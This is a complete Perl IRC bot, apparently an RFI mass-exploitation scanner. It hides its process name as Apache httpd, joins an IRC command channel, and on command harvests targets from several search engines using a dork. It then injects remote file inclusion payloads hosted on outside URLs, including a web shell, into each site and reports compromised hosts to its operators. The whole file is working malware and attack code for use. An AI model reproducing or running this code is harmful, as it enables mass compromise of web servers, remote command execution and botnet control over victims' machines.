#!/usr/bin/perl
#Mic22 Is Here!

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $processo = "/usr/local/apache/bin/httpd -DSSL";
my $cmd="http://www.jxlove.or.kr/bbs/data/special/dgpbpsun1.jpg";
my $server="irc.shellnetbr.com";
my $porta="1999";
my $nick="OwnScanner05";
my $canale="#scan05";
my $verbot = "6.51";
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER Own 8 *  : Own : Own@google.it : Gbot :Sbot\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $canale :.out/){
stampa($sk, "QUIT");
}


if ($line=~ /PRIVMSG $canale :.help/){
stampa($sk, "PRIVMSG $canale :4.::[7Help] Scanner RFI Ver $verbot (C)Edu_loco4::.");
stampa($sk, "PRIVMSG $canale :4.::[7Help] Para scan .scan String Dork4::.");
stampa($sk, "PRIVMSG $canale :4.::[7Help] Para Ver os sites De pesquisa .engine4::.");
stampa($sk, "PRIVMSG $canale :4.::[7Help] Para ver os bugs recentes .mwultimi4::.");
stampa($sk, "PRIVMSG $canale :4.::[7Help] Para ver a info do Bot/Maquina .info4::.");
stampa($sk, "PRIVMSG $canale :4.::[7Help] Edu_loco OwNz4::.");
}

if ($line=~ /PRIVMSG $canale :.info/){
my $sysos = `uname -sr`;
my $uptime = `uptime`;
if ($sysos =~ /freebsd/i ) {
$sysname = `hostname`;
$memory = `expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;
$swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
chomp($memory);
chomp($swap);
}
elsif ( $sysos =~ /linux/i ) {
$sysname = `hostname -f`;
$memory = `free -m |grep -i mem | awk '{print \$2}'`;
$swap = `free -m |grep -i swap | awk '{print \$2}'`;
chomp($swap);
chomp($memory);
}
else {
$sysname ="No Found";;
$memory ="No found";
$swap ="No Found";
}
$uptime=~s/\n//g;
$sysname=~s/\n//g;
$sysos=~s/\n//g;
stampa($sk, "PRIVMSG $canale :4.::[2Info] Server: $server :| - $porta4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Info] SO/Hostname:12 $sysos - $sysname4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Info] Process/PID:12 $processo - $$4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Info] Uptime:12 $uptime4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Info] Memory/Swap:12 $memory - $swap4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Info] Perl Version/BOT:12 $] - $verbot4::.");
}


if ($line=~ /PRIVMSG $canale :.engine/){
stampa($sk, "PRIVMSG $canale :4.::[2Sites] Google, Yahoo, MsN, Altavista, Libero, AllTheWeb, AsK, UoL, AoL4::.");
}

if ($line=~ /PRIVMSG $canale :.mwultimi/){
my @ltt=();
my @bug=();
my $x;
my $page="";
my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$socke>;
$page="@r";
close($socke);
while ($page =~  m/<title>(.*)</g){
$x = $1;
if ($x =~ /\&lt\;/) {
$x =~ s/\&lt\;/</g;
}
if ($x !~ /milw0rm/) {
push (@bug,$x);
}}
while ($page =~  m/<link.*expl.*([0-9]...)</g) {
if ($1 !~ m/milw0rm.com|exploits|en/){
push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
}}
stampa($sk, "PRIVMSG $canale :4.::[2MillW0rm] MillW0rm Ultimos Bugs4::.");
foreach $x (0..(@ltt - 1)) {
stampa($sk, "PRIVMSG $canale :4.::[2MillW0rm] MillW0rm Ultimos Bugs $bug[$x] - $ltt[$x]4::.");
sleep 1;
}}

if ($line=~ /PRIVMSG $canale :.scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $canale :4.::[9Dork] $dork4::.");
stampa($sk, "PRIVMSG $canale :4.::[4Bug] $bug4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Scan started Now!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Google] Started...!4::.");
my @glist=&google($dork);
stampa($sk, "PRIVMSG $canale :4.::[2Yahoo] Started...!4::.");
my @ylist=&yahoo($dork);
stampa($sk, "PRIVMSG $canale :4.::[2Msn] Started...!4::.");
my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $canale :4.::[2Altavista] Started...!4::.");
my @alist=&altavista($dork);
stampa($sk, "PRIVMSG $canale :4.::[2Libero] Started...!4::.");
my @llist=&libero($dork);
stampa($sk, "PRIVMSG $canale :4.::[2AllTheWeb] Started...!4::.");
my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $canale :4.::[2AsK] Started...!4::.");
my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $canale :4.::[2UoL] Started...!4::.");
my @uollist=&uol($dork);
stampa($sk, "PRIVMSG $canale :4.::[2AoL] Started...!4::.");
my @aollist=&aol($dork);
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Sites pelo [9Dork] $dork4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Google ".scalar(@glist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Yahoo ".scalar(@ylist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] MsN ".scalar(@mlist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Altavista ".scalar(@alist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Libero ".scalar(@llist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] All-The-Web ".scalar(@allist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] Ask ".scalar(@asklist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] UoL ".scalar(@uollist)." Siti!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Scan] AoL ".scalar(@aollist)." Siti!4::.");
push(my @tot, @glist, @ylist, @mlist, @alist, @llist, @allist,@asklist,@uollist,@aollist);
stampa($sk, "PRIVMSG $canale :4.::[13Total] 8Total De  ".scalar(@tot)." Sites!4::.");
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :4.::[2Cleaned] Cleaned ".scalar(@puliti)." Sites!4::.");
stampa($sk, "PRIVMSG $canale :4.::[2Vuln] Iniciando Teste De Vulnerabilidade'!4::.");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){
stampa($sk, "PRIVMSG $canale :4.::[2Vuln] Exploiting ".$contatore." de ".$uni. " sites4::.");
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :4.::[4Vuln] Finished [9Dork] $dork4::.");
}
my $test="http://".$sito.$bug.$cmd."?";
my $print="http://".$sito.$bug."http://www.gonfiabiligamespark.it/flash/r57.txt"."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
stampa($sk, "PRIVMSG $canale :4.::[2Safe(4 OFF ) [Vuln] $print4::.");
stampa($sk, "PRIVMSG Edu_loco :4.::[2Safe(4 OFF ) [Vuln] $print4::.");
stampa($sk, "PRIVMSG Morientes :4.::[2Safe(4 OFF ) [Vuln] $print4::.");
stampa($sk, "PRIVMSG K3nshin :4.::[2Safe(4 OFF ) [Vuln] $print4::.");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
stampa($sk, "PRIVMSG $canale :4.::[2Safe(3 ON ) [Vuln] $print4::.");
}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<em class=yschurl>(.+?)\<\/em>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=".$pg."&start=".$i."&query=".key($key));
my $Res=query($Lib);
while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}